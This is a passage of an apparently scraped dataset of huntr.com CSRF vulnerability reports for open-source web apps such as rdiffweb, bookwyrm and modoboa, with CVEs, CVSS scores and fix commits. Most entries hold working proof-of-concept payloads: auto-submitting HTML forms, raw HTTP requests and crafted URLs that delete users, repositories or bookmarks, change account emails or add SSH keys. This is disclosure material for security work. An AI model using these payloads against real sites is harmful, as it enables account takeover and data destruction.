"https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/8e14ac93669df4f35fcdebd55dc9d2f0fed3ed48", "description": "Description\nGET /admin/domains/{id}/delete/ page is vulnerable to a CSRF attack.\nProof of Concept\nLogin as admin.\nCreate a domain to be deleted. E.g. the domain ID is 4.\nOpen the following file in the browser.\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://127.0.0.1:8000/admin/domains/4/delete/\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nImpact\nAdmin would be forced to delete domains."}, "https://huntr.com/bounties/17bc1b0f-1f5c-432f-88e4-c9866ccf6e10/": {"cve": "CVE-2022-4646", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4646", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/e6f0d8002129be90fe82fa3e3ea0a6942caba398", "description": "Description\nwe haven't csrf token in logout basically this is not really issue but in rdiffweb we have logically redirect user to last source like logout method. in this case attacker can chain two request(logout,login) that lead to dos\nProof of Concept\nsend get logout request and get session_id\nGET /logout HTTP/1.1\nHost: 127.0.0.1:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: session_id=475774603a53b2967f21e2be80de38d1e37babce\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nsend login request with previous session_id in response\nPOST /login/ HTTP/1.1\nHost: 127.0.0.1:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://127.0.0.1:8080/login/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 44\nOrigin: http://127.0.0.1:8080\nConnection: close\nCookie: session_id=0fc203ce03dac2a8cc4dafc1852b920643aa8e85\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\nlogin=admin&password=admin123&submit=Sign+in\nresponse like that\nHTTP/1.1 303 See Other\nContent-Type: text/html;charset=utf-8\nServer: CherryPy/18.8.0\nDate: Mon, 05 Dec 2022 06:40:58 GMT\nX-Frame-Options: DENY\nCache-Control: no-cache, no-store, must-revalidate, max-age=0\nPragma: no-cache\nExpires: 0\nReferrer-Policy: same-origin\nX-Content-Type-Options: nosniff\nX-Xss-Protection: 1; mode=block\nContent-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'\nLocation: http://127.0.0.1:8080/\nContent-Language: en_US\nVary: Accept-Encoding\nContent-Length: 90\nSet-Cookie: session_id=4e13178447f685e835b6f9c78fdd203b32f8048a; HttpOnly; Path=/; SameSite=Lax\nConnection: close\n\nThis resource can be found at <a href=\"http://127.0.0.1:8080/\">http://127.0.0.1:8080/</a>.\nlogin and logout unlimit\nImpact\nUser never logged to rdiffweb"}, "https://huntr.com/bounties/8834c356-4ddb-4be7-898b-d76f480e9c3f/": {"cve": "CVE-2022-3274", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3274", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (7)\nAttack vector\nAdjacent\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/e974df75bdbcff3996ad70bd1b4424ec1485ea3f", "description": "Description\nThe change email ID is vulnerable to CSRF. The attacker can change the email ID of the user.\nProof of Concept\n1.Login into the application https://rdiffweb-demo.ikus-soft.com.\n2.Open the URL https://rdiffweb-demo.ikus-soft.com/prefs/general?username=admin&email=csrf%40test.com&action=set_profile_info.\n3.The email ID of the user is changed.\n4.The email ID is changed.\nImpact\nThis could change the email ID of the user."}, "https://huntr.com/bounties/7b6ec9f4-4fe9-4716-8dba-3491ffa3f6f2/": {"cve": "CVE-2022-3267", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3267", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.8)\nAttack vector\nAdjacent\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/20fc0d304412cc569b21f31e52cb8b94094d6314", "description": "Description\nThe malicious user can change the settings of repository by sending the URL to the victim.\nProof of Concept\n1.Login into the application https://rdiffweb-demo.ikus-soft.com/settings/admin/test-encoding .\n2.Go to test-encoding.\n3.Check that the value of remove older is forever.\n4.Open the URL https://rdiffweb-demo.ikus-soft.com/settings/admin/test-encoding?keepdays=1 .\n5.Refresh the page.\n6.The setting is updated.\nImpact\nA malicious user can change the setting of repository."}, "https://huntr.com/bounties/5ec206e0-eca0-4957-9af4-fdd9185d1db3/": {"cve": "CVE-2022-3233", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3233", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/18a5aabd48fa6d2d2771a25f95610c28a1a097ca", "description": "Description\nPeriodic updates of repositories were sent as notifications to the user's email and here GET request sent to the server for modifying repository notifications settings is accepted by the server, which can lead to disabling notifications through a CSRF attack.\nProof of Concept\nReplace repos with valid repo names\nhttps://rdiffweb-demo.ikus-soft.com/prefs/notification?repo1%2FC=0&repo2=0&repo3=0&action=set_notification_info\nexample:\nhttps://rdiffweb-demo.ikus-soft.com/prefs/notification?MyWindowsLaptop%2FC=0&test-encoding=0&testcases=0&action=set_notification_info\nImpact\nRepository notifications sent to user's email will be disabled."}, "https://huntr.com/bounties/15c8fd98-7f50-4d46-b013-42710af1f99c/": {"cve": "CVE-2022-3232", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3232", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/422791ea45713aaaa865bdca74addb9fffd93a71", "description": "Description\nServer accepts the GET request for deleting repositories and users which can lead to CSRF attack on repositories'.\nProof of Concept\nOpen the below URL after logging in to the admin account in demo site.\nFor deleting Repository : Replace \"replace-here\" with a repo name\nhttps://rdiffweb-demo.ikus-soft.com/delete/admin/replace-here?action=&confirm=replace-here\nFor deleting User\n   https://rdiffweb-demo.ikus-soft.com/admin/users?action=delete&username=username\nImpact\nDeletion of repositories and users"}, "https://huntr.com/bounties/907c050b-b460-4b51-9afc-aaddfee0423d/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/f10ead1b52a864aa5c7504e08838307e8e0f4562", "description": "Description\nHello everyone,\nRdiffweb offers a profile section where the admin user can change his informations such as the username, the email etc..., when the admin changes his username and his email; the following POST requests is sent:\nPOST /prefs/general HTTP/1.1\nHost: rdiffweb-demo.ikus-soft.com\nCookie: session_id=27c2d6767e8f524663f44191d0a0cf9bac2d45c7\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nOrigin: https://rdiffweb-demo.ikus-soft.com\nReferer: https://rdiffweb-demo.ikus-soft.com/prefs/general\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 61\n\nusername=admin&email=test%40admin.net&action=set_profile_info\nthe above POST requests isn't protected by an anti-csrf token to prevent CSRF attacks as the software takes a different approach which is setting the SameSite flag to LAX which is somehow helpful but the above request can be sent also using the GET verb so the LAX attribute won't work in this case; an attacker would host an HTML page containing an a tag that initiates a request to the vulnerable endpoint once it's clicked !\nProof of Concept\n<html>\n        <body>\n                 <a href=\"https://rdiffweb-demo.ikus-soft.com/prefs/general?username=admin&email=test%40admin.net&action=set_profile_info\">Click Here !</a>\n        </body>\n</html>\nImpact\nthe CSRF targets a critical function (email changing) so this could result in an Account Takeover ..."}, "https://huntr.com/bounties/1fa1aac9-b16a-4a70-a7da-960b3908ae1d/": {"cve": "CVE-2022-3221", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3221", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/9125f5a2d918fed0f3fc1c86fa94cd1779ed9f73", "description": "Description\nWhile adding SSH public keys to the profile, the server accepts the GET request which results in adding an SSH public key to the profile and leads to unauthorised access to the system and backups.\nProof of Concept\nOpen the below url after logging in to the demo site.SSH Public key will be added to the profile.\nhttps://rdiffweb-demo.ikus-soft.com/prefs/sshkeys?action=add&title=ssh1&key=ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAAAgQCzurRNVKwb0ZJCmUgGenoe4vth5gnHxgnzjHSUO8r7IZiouB6DAciiVUAryV6MQm5trwIXNo0QDwFxyX99exIwUlDu3OzhZHKKbb721hCID17AWZMAQIgxQdu6b27s5YgJXsaxXWvEO2lSRVOnVXoCSI7mK5St%2FCJ8O1OdXivNIQ%3D%3D+noname%0D%0A\nOR\n1 - On burpsuite, capture the SSH public key adding request and right click and click on change request method , it will change the POST request method to GET after that right click and Copy that URL.\n2 - Login to the demo site and open that copied URL. SSH key will add to the account.\nImpact\nUnauthorized access to the system and backups."}, "https://huntr.com/bounties/740ac468-47b3-4937-98ef-01e8e5e1382b/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/42455b19ff973db2728f9289cae3091c39d1f82d", "description": "\u270d\ufe0f Description\nHello dear Rdiffweb team.\nI found a CSRF vulnerability on following endpoint that attackers able to change the email of a user with PoC.html\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nuser with right privileges should be logged in Firefox or Safari.\nUsers go to a website that contain PoC.html\n3.after visiting attacker's website a user's email with username admin will be changed to attacker@mail.com. // PoC.html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://rdiffweb-demo.ikus-soft.com/prefs/general\" method=\"POST\">\n      <input type=\"hidden\" name=\"username\" value=\"admin\" />\n      <input type=\"hidden\" name=\"email\" value=\"attacker&#64;mail&#46;com\" />\n      <input type=\"hidden\" name=\"action\" value=\"set&#95;profile&#95;info\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nAlso attacker can send multiple request with help of Iframes.\nFix\nI just want to suggest you to set a CSRF token for this form."}, "https://huntr.com/bounties/a707da35-3044-407d-9f75-f6920066c66d/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/d7bf348c7760f2edcce59ac76840e7b78350d821", "description": "Description\nI found a possible Cross-Site Request Forgery (CSRF) vulnerability in Login Form.\n  Login CSRF is a type of attack where the attacker can force the user to log in to the attacker\u2019s account on a website and thus reveal information about what the user is doing while logged in.\nProof of Concept\nPoC.html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://bookwyrm.social/login?next=/\" method=\"POST\">\n      <input type=\"hidden\" name=\"localname\" value=\"username_test\" />\n      <input type=\"hidden\" name=\"password\" value=\"password_test\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nOpen the PoC.html file and CSRF exploited successfully.\nImpact\nIn a login CSRF attack, the attacker forges a login request to an honest site using the attacker\u2019s user name and password at that site. If the forgery succeeds, the honest server responds with a Set-Cookie header that instructs the browser to mutate its state by storing a session cookie, logging the user into the honest site as the attacker. This session cookie is used to bind subsequent requests to the user\u2019s session and hence to the attacker\u2019s authentication credentials. The attacker can later log into the site with his legitimate credentials and view private information like activity history that has been saved in the account."}, "https://huntr.com/bounties/a3045614-1125-4901-bb7a-9d51be4beeed/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/spiral-project/ihatemoney", "fix_commit": "https://www.github.com/spiral-project/ihatemoney/commit/31fef4f4d66489638a4805be76a995515de0c557", "description": "Summary: Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. ... If the victim is an administrative account, CSRF can compromise the entire web application.\nSteps To Reproduce: 1.Create a CSRF logout POC using the following code. Code That i use:-- <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <script>history.pushState('', '', '/')</script> <form action=\"https://ihatemoney.org/exit\"> <input type=\"submit\" value=\"Submit request\" /> </form> </body> </html>\nImpact\nThis vulnerability is capable of CSRF. Logout any victim into the attacker account, send the HTML made by attacker and then logout him from the Session. The hacker selected the Cross-Site Request Forgery (CSRF) weakness."}, "https://huntr.com/bounties/760c144c-fec7-451a-b70c-92c007faa83d/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/f1ae64543f5e24e6e9d0429a111a2617e35b0d93", "description": "Description\nAn attacker is able to download data from a user via the CSV Export function. The export will include all the books on your shelves, books you have reviewed, and books with reading activity.\nVulnerable URL\nhttps://bookwyrm.social/preferences/export/file\nProof of Concept\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://bookwyrm.social/preferences/export/file\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nImpact\nThis vulnerability is capable of download user reading data."}, "https://huntr.com/bounties/6f54a668-f182-4721-a9ac-b68b1ffad676/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/cf595916f96037f174e81636f9de45cb5c122c84", "description": "Description\nAn attacker is able to log out a user if a logged-in user visits the attacker's website.\nProof of Concept\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://book.dansmonorage.blue/logout\">\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nImpact\nThis vulnerability is capable of forging users to unintentional logout.\nMore details\nOne way GET request could be abused here is that a person (competitor perhaps:) placed an image tag with src=\"<your logout link>\" anywhere on the internet, and if a user of your site stumbles upon that page, he will be unknowingly logged out. This is why it should be a POST request with a CSRF token.\nNote\nWhile this cannot harm a user's account, it can be a great annoyance and is a valid CSRF."}, "https://huntr.com/bounties/b4005382-35b5-4f69-a2af-cc46d9acd501/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/sissbruecker/linkding", "fix_commit": "https://www.github.com/sissbruecker/linkding/commit/eca98a13f5bc18810c4db4958237d327a2bba5a0", "description": "Description\nCSRF bug to remove bookmark\nProof of Concept\nThere is no csrf token check during bookmark remove .\nLet say there is two user 1. user-A --> victim\n2. user-B --> attacker \\\nSTEP\n1. user-A create bookmark and lets bookmark id is 123\n2. Now user-B attacker send a link https://demo.linkding.link/bookmarks/123/remove?return_url=%2Fbookmarks to victim user-A .\nWhen user-A open this link then his bookmark will be deleted\nImpact\ncsrf bug to delete victim bookmark"}, "https://huntr.com/bounties/2bb5be32-b318-4a5c-9508-dea02fa68980/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Low (3.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/liangliangyy/djangoblog", "fix_commit": "https://www.github.com/liangliangyy/djangoblog/commit/ccbb65c048de3cedf1d45e8bc2a211f183bf1346", "description": "Description\nHi there, I would like to report a Cross Site Request Forgery in djangoblog source code. Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. This is due to the use of GET request in refresh cache url.\nProof of Concept\nInstall a local instance of djangoblog\nAccess this link /refresh and see that all cache is cleared.\nIn real attack scenario, the attacker would feed this link to django blog admin and when they clicks it, the cache is cleared.\nImpact\nThis vulnerability is capable of forcing the admin to clear djangoblog cache against his/her will."}, "https://huntr.com/bounties/e204a768-2129-4b6f-abad-e436309c7c32/": {"cve": "CVE-2021-4162", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-4162", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/archivy/archivy", "fix_commit": "https://www.github.com/archivy/archivy/commit/796c3ae318eea183fc88c87ec5a27355b0f6a99d", "description": "Title\nMissing CSRF token validation leads to note deletion.\nSummary\nRoute /dataobj/delete/<int:dataobj_id> is responsible for note deletion. Instead of POST it accepts GET and DELETE methods.\n@app.route(\"/dataobj/delete/<int:dataobj_id>\", methods=[\"DELETE\", \"GET\"])\ndef delete_data(dataobj_id):\n    try:\n        data.delete_item(dataobj_id)\n    except BaseException:\n        flash(\"Data could not be found!\", \"error\")\n        return redirect(\"/\")\n    flash(\"Data deleted!\", \"success\")\n    return redirect(\"/\")\nWhile they both contain CSRF tokens, in fact the token is not verified, so it is possible to exclude it from query which leads to CSRF.\nSteps to reproduce\n1. Create any note, get it's ID.\n2. Run page from PoC.html with concrete ID in your browser, click the button.\n3. Observe that the note with specified ID was deleted.\nProof of Concept\n// PoC.html\n<form action=\"http://127.0.0.1:5000/dataobj/delete/{yourNoteID}\" method=\"GET\">\n<input type=\"submit\" value=\"Click me\"/>\n</form>\nPossible remediation\nUse POST method instead and verify CSRF token.\nImpact\nThis vulnerability is capable of deleting user's notes."}, "https://huntr.com/bounties/5ee61635-4a57-41f6-9536-a07737e99db2/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/0eba3b7857e61f864d38b5e3cfa13344445963f8", "description": "\u270d\ufe0f Description\nHello dear Rdiffweb team.\nI found a CSRF vulnerability on following endpoint that attackers able to Create users with PoC.html\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nUser with right privileges should be logged in Firefox or Safari.\nUsers go to a website that contain PoC.html\n3.after visiting attacker's website a admin user with username aaaa will be created. // PoC.html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://rdiffweb-demo.ikus-soft.com/admin/users\" method=\"POST\">\n      <input type=\"hidden\" name=\"action\" value=\"add\" />\n      <input type=\"hidden\" name=\"username\" value=\"aaaa\" />\n      <input type=\"hidden\" name=\"email\" value=\"ad&#64;mm&#46;com\" />\n      <input type=\"hidden\" name=\"password\" value=\"admin123\" />\n      <input type=\"hidden\" name=\"user&#95;root\" value=\"aaaa\" />\n      <input type=\"hidden\" name=\"role\" value=\"0\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nAlso attacker can send multiple request with help of Iframes.\nFix\nI just want to suggest you to set a CSRF token for this form."}, "https://huntr.com/bounties/b558dfb2-38a4-4ea7-a53f-6808065337aa/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/0eba3b7857e61f864d38b5e3cfa13344445963f8", "description": "\u270d\ufe0f Description\nHello dear Rdiffweb team.\nI found a CSRF vulnerability on following endpoint that attackers able to Delete repositories History with PoC.html\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nuser with right privileges should be logged in Firefox or Safari.\nUsers go to a website that contain PoC.html\n3.after visiting attacker's website a repo History with name test-encoding will be deleted. // PoC.html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://rdiffweb-demo.ikus-soft.com/delete/admin/testcases\" method=\"POST\">\n      <input type=\"hidden\" name=\"confirm\" value=\"testcases\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nAlso attacker can send multiple request with help of Iframes.\nFix\nI just want to suggest you to set a CSRF token for this form."}, "https://huntr.com/bounties/29ea6515-3a3b-48ca-aa3c-cf2e4d4dd0b4/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/fc257f68f2cb8049bf1a6df806b2766079c6909d", "description": "\u270d\ufe0f Description\nHello dear Rdiffweb team.\nI found a CSRF vulnerability on following endpoint that attackers able to Delete users with PoC.html\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nuser with right privileges should be logged in Firefox or Safari.\nUsers go to a website that contain PoC.html\n3.after visiting attacker's website a user with username aaaa will be deleted. // PoC.html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://rdiffweb-demo.ikus-soft.com/admin/users\" method=\"POST\">\n      <input type=\"hidden\" name=\"action\" value=\"delete\" />\n      <input type=\"hidden\" name=\"username\" value=\"aaaa\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nAlso attacker can send multiple request with help of Iframes.\nFix\nI just want to suggest you to set a CSRF token for this form."}, "https://huntr.com/bounties/62c676b7-b068-4d96-a078-86bc39187646/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/fc257f68f2cb8049bf1a6df806b2766079c6909d", "description": "\u270d\ufe0f Description\nHello dear Rdiffweb team.\nI found a CSRF vulnerability on following endpoint that attackers able to Create a SSH key with PoC.html\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\nUser with right privileges should be logged in Firefox or Safari.\nUsers go to a website that contain PoC.html\n3.after visiting attacker's website a SSH key with name bob@thinkpad-t530 will be created. // PoC.html\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://rdiffweb-demo.ikus-soft.com/prefs/sshkeys\" method=\"POST\">\n      <input type=\"hidden\" name=\"action\" value=\"add\" />\n      <input type=\"hidden\" name=\"title\" value=\"bob&#64;thinkpad&#45;t530&#32;\" />\n      <input type=\"hidden\" name=\"key\" 